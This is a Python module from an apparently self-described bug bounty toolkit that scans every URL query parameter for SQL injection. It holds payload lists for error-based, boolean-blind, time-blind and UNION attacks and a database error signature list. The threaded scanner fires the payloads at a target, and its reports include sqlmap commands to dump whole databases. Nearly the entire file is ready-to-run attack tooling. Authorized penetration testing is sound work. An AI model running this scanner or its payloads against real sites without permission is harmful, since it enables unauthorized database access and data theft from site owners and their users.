# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""SQL Injection — error-based, boolean-blind, time-blind, UNION-based."""

import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

# ── Payloads ──────────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'", '"', "''", "\\", "`;",
    "' OR '1'='1", "\" OR \"1\"=\"1",
    "' OR 1=1--", "\" OR 1=1--",
    "' OR 1=1#", "' OR 1=1/*",
    "admin'--", "' OR 'x'='x",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND 1=CONVERT(int,@@version)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "1;SELECT SLEEP(0)--",
    "' AND 1=(SELECT 1 FROM dual)--",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR 'a'='a", "' OR 'a'='b"),
]

TIME_PAYLOADS = [
    ("' AND SLEEP(2)--",                            2),
    ("' OR SLEEP(2)--",                             2),
    ("1' AND SLEEP(2)--",                           2),
    ("'; WAITFOR DELAY '0:0:2'--",                  2),
    ("' AND (SELECT * FROM (SELECT SLEEP(2))a)--",  2),
    ("' AND BENCHMARK(3000000,MD5(1))--",           3),
    ("\" AND SLEEP(2)--",                           2),
    ("') AND SLEEP(2)--",                           2),
    ("1;SELECT pg_sleep(2)--",                      2),
    ("' OR (SELECT 1 FROM pg_sleep(2))--",          2),
]

UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT @@version,NULL,NULL--",
    "' UNION SELECT user(),NULL,NULL--",
    "' UNION SELECT database(),NULL,NULL--",
    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
]

ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-", "microsoft ole db",
    "sqlite_", "postgresql", "syntax error", "unclosed quotation",
    "you have an error in your sql", "warning: mysql",
    "supplied argument is not a valid mysql", "invalid query",
    "pg_query", "pg_exec", "unterminated string", "odbc driver",
    "sql server", "sqlstate", "db2 error", "jdbc", "mysql error",
    "division by zero", "microsoft jet database", "access database engine",
    "quoted string not properly terminated", "invalid column name",
    "conversion failed", "data type mismatch", "column count doesn't match",
]

CVSS_SCORE = "9.8 (Critical)"
CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"


def _check_param(base_url: str, param: str, orig_val: str, timeout: int) -> list[dict]:
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    def _build(payload):
        q = dict(qs)
        q[param] = [payload]
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)))

    # ── Error-based ───────────────────────────────────────────────────────────
    for payload in ERROR_PAYLOADS:
        resp = fetch_url(_build(orig_val + payload), timeout=timeout)
        if resp:
            body = (resp.get("body") or "").lower()
            for sig in ERROR_SIGNATURES:
                if sig in body:
                    return [{
                        "type": "SQL Injection (Error-Based)",
                        "severity": "CRITICAL",
                        "url": _build(orig_val + payload),
                        "param": param,
                        "payload": payload,
                        "cvss_score": CVSS_SCORE,
                        "cvss_vector": CVSS_VECTOR,
                        "db_signature": sig,
                        "description": f"Error-based SQLi confirmed in parameter '{param}'. DB error '{sig}' exposed.",
                        "steps_to_reproduce": (
                            f"1. Send GET request to: {_build(orig_val + payload)}\n"
                            f"2. Observe DB error '{sig}' in response body.\n"
                            f"3. Escalate with sqlmap: sqlmap -u '{base_url}' -p {param} --batch --level=5"
                        ),
                        "impact": "Full database read/write access. Possible OS command execution via INTO OUTFILE or xp_cmdshell.",
                        "recommendation": "Use parameterized queries (prepared statements). Never concatenate user input into SQL strings. Deploy a WAF.",
                    }]

    # ── Boolean-blind ─────────────────────────────────────────────────────────
    base_resp = fetch_url(base_url, timeout=timeout)
    base_body = (base_resp.get("body") or "") if base_resp else ""
    for true_p, false_p in BOOLEAN_PAYLOADS:
        r_true  = fetch_url(_build(orig_val + true_p),  timeout=timeout)
        r_false = fetch_url(_build(orig_val + false_p), timeout=timeout)
        if r_true and r_false:
            bt = r_true.get("body") or ""
            bf = r_false.get("body") or ""
            if bt == base_body and bf != base_body and len(bt) > 100:
                return [{
                    "type": "SQL Injection (Boolean-Based Blind)",
                    "severity": "CRITICAL",
                    "url": _build(orig_val + true_p),
                    "param": param,
                    "payload_true": true_p,
                    "payload_false": false_p,
                    "cvss_score": CVSS_SCORE,
                    "cvss_vector": CVSS_VECTOR,
                    "description": f"Boolean-blind SQLi in '{param}': TRUE condition returns normal response, FALSE returns different.",
                    "steps_to_reproduce": (
                        f"1. TRUE condition: {_build(orig_val + true_p)} → same as baseline\n"
                        f"2. FALSE condition: {_build(orig_val + false_p)} → different response\n"
                        f"3. Dump DB: sqlmap -u '{base_url}' -p {param} --technique=B --dump"
                    ),
                    "impact": "Full database exfiltration via binary search. All tables/records can be extracted.",
                    "recommendation": "Use parameterized queries. Implement input validation and type checking.",
                }]

    # ── Time-based blind ──────────────────────────────────────────────────────
    for payload, delay in TIME_PAYLOADS:
        test_url = _build(orig_val + payload)
        t0 = time.time()
        fetch_url(test_url, timeout=max(timeout, delay + 3))
        elapsed = time.time() - t0
        if elapsed >= delay - 0.4:
            return [{
                "type": "SQL Injection (Time-Based Blind)",
                "severity": "CRITICAL",
                "url": test_url,
                "param": param,
                "payload": payload,
                "delay_observed": round(elapsed, 2),
                "cvss_score": CVSS_SCORE,
                "cvss_vector": CVSS_VECTOR,
                "description": f"Time-blind SQLi in '{param}': SLEEP({delay}s) caused {elapsed:.1f}s response delay.",
                "steps_to_reproduce": (
                    f"1. Send: {test_url}\n"
                    f"2. Observe {elapsed:.1f}s response time (normal baseline ~{timeout//2}s).\n"
                    f"3. Exfil: sqlmap -u '{base_url}' -p {param} --technique=T --dump"
                ),
                "impact": "Full database exfiltration via time-based inference. Works even with no visible output.",
                "recommendation": "Use parameterized queries. Enforce query timeouts. Use allowlists for input values.",
            }]

    return findings


def run(base_url: str, domain: str = "", timeout: int = 5, threads: int = 15, **kwargs) -> dict:
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query)
    if not qs:
        return {"findings": [], "summary": {"params_tested": 0, "note": "No query parameters in URL."}}

    findings: list[dict] = []
    with ThreadPoolExecutor(max_workers=min(threads, len(qs))) as ex:
        futures = {ex.submit(_check_param, base_url, p, qs[p][0], timeout): p for p in qs}
        for fut in as_completed(futures):
            findings.extend(fut.result())

    return {
        "findings": findings,
        "summary": {
            "params_tested": len(qs),
            "vulnerable": len(findings),
            "techniques": ["error-based", "boolean-blind", "time-based-blind"],
        },
    }


if __name__ == "__main__":
    pass
